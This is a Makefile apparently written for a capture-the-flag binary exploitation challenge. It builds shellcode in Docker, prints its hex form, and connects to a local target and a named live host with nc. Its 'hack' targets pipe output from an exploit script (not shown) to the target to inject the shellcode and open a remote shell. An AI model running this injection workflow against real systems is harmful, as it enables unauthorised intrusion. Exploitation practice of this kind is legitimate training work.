# Options
Q = $(if $(filter 1,$V),,@)
CAPTION = $(if $(filter 1,$V),echo,printf)

LIVE_ADDR = 0x804c0c0
LIVE_HOST = shutdown.tamagodzilla.lol

TARGET_ADDR = 0x4040c0
TARGET_HOST = localhost
TARGET_PORT = 1337

DOCKER_MOUNTS := -v `pwd`:/result -v `pwd`/shellcode.asm:/work/shellcode.asm:ro -v `pwd`/Makefile.toolchain:/work/Makefile:ro
DOCKER_OPTIONS :=  -e V="$V" --platform=linux/x86_64 --rm $(DOCKER_MOUNTS) --workdir /work `cat .docker_toolchain_image_hash`

# Predefined
SHELL := bash
THIS_MAKEFILE := $(lastword $(MAKEFILE_LIST))
THIS_DIR := $(abspath $(dir $(THIS_MAKEFILE)))

GREEN  := $(shell tput -Txterm setaf 2 2>/dev/null)
CYAN   := $(shell tput -Txterm setaf 6 2>/dev/null)
YELLOW := $(shell tput -Txterm setaf 3 2>/dev/null)
RED    := $(shell tput -Txterm setaf 1 2>/dev/null)
BOLD   := $(shell tput -Txterm bold 2>/dev/null)
RESET  := $(shell printf "\\033[00m")

# This Makefile assumes that make is being invoked from the Makefile's location.
ifneq ($(shell pwd),$(THIS_DIR))
$(error This project requires make to be invoked inside '$(THIS_DIR)')
endif

# Rules
.DEFAULT_GOAL := help


## Toolchain:
.docker_toolchain_image_hash: Dockerfile
	@echo "Building ${YELLOW}toolchain${RESET} from ${CYAN}$^${RESET}..."
	$Q docker build --platform=linux/x86_64 --iidfile $@ .
	@echo "${BOLD}${GREEN}OK!${RESET}"

.PHONY: toolchain
toolchain: .docker_toolchain_image_hash ## Builds toolchain docker image

.PHONY: toolchain-exec
toolchain-exec: .docker_toolchain_image_hash ## Runs toolchain docker image with interactive shell
	@echo "Entering ${YELLOW}toolchain${RESET} from ${CYAN}`cat $<`${RESET}..."
	$Q docker run -it $(DOCKER_OPTIONS) bash

## Shellcode:
shellcode.bin: shellcode.asm .docker_toolchain_image_hash ## Builds shellcode binary using toolchain docker image
	@echo "Building ${YELLOW}$@${RESET} from ${CYAN}$<${RESET}..."
	$Q docker run $(DOCKER_OPTIONS) make /result/$@ | sed 's/^/  /'
	@echo "${BOLD}${GREEN}OK!${RESET}"

.PHONY: shellcode-raw
shellcode-raw: shellcode.bin ## Prints shellcode hex representation
	$Q cat shellcode.bin | xxd -g0 -p | tr -d '\n' | sed 's/.\{2\}/\\x&/g' | sed 's/^/Hex representation of the ${CYAN}$^${RESET}:\n\n  /' && echo && echo

## Run:
.PHONY: run
run: .docker_toolchain_image_hash ## Runs target instance
	@cd target && $(MAKE) TARGET_PORT=$(TARGET_PORT) $@

## Connect:
.PHONY: connect
connect: ## Connects with the target
	@echo "Connecting to ${YELLOW}$(TARGET_HOST):$(TARGET_PORT)${RESET}..."
	$Q nc $(TARGET_HOST) $(TARGET_PORT) || echo "${RED}Connection terminated${RESET}"

.PHONY: connect-live
connect-live: ## Connects with the target (live challenge)
	@$(MAKE) TARGET_HOST=$(LIVE_HOST) TARGET_ADDR=$(LIVE_ADDR) connect

## Hack:
.PHONY: hack
hack: shellcode.bin exploit.py ## Injects, executes shellcode on the target, opens shell access
	@$(CAPTION) "Verifying shellcode ${YELLOW}$<${RESET}... "
	$Q python3 exploit.py -c $<
	@echo "${BOLD}${GREEN}OK!${RESET}"

	@echo "Hacking into ${YELLOW}$(TARGET_HOST):$(TARGET_PORT)${RESET} with ${CYAN}$<${RESET} @ ${CYAN}$(TARGET_ADDR)${RESET} payload..."
	$Q cat <(python3 exploit.py $< $(TARGET_ADDR)) - | nc $(TARGET_HOST) $(TARGET_PORT) || echo "${RED}Connection terminated${RESET}"

.PHONY: hack-live
hack-live: shellcode.bin exploit.py ## Injects, executes shellcode on the target, opens shell access (live challenge)
	@$(MAKE) TARGET_HOST=$(LIVE_HOST) TARGET_ADDR=$(LIVE_ADDR) hack


## Cleanup:
.PHONY: clean
clean: ## Removes compiled files
	@echo "Cleaning up compiled files... "
	$Q rm -fv shellcode.bin | sed 's/^/  /'
	@echo "${BOLD}${GREEN}OK!${RESET}"

.PHONY: distclean
distclean: ## Removes all generated files
	@echo "Cleaning up all generated files... "
	$Q rm -fv shellcode.bin .docker_toolchain_image_hash | sed 's/^/  /'
	@echo "${BOLD}${GREEN}OK!${RESET}"


## Help:
.PHONY: help
help: ## Show this help (default target)
	@echo 'Usage:'
	@echo '  ${BOLD}make ${YELLOW}<target>${RESET}'
	@echo ''
	@echo 'Targets:'
	@awk 'BEGIN {FS = ":.*?## "} { \
		if (/^[.a-zA-Z_-]+:.*?##.*$$/) {printf "    ${BOLD}${YELLOW}%-20s${RESET}${GREEN}%s${RESET}\n", $$1, $$2} \
		else if (/^## .*$$/) {printf "  ${CYAN}%s${RESET}\n", substr($$1,4)} \
		}' $(THIS_MAKEFILE)
	@echo ''
	@echo 'You can set V environment variable to 1 to enable verbose output.'
	@echo ''
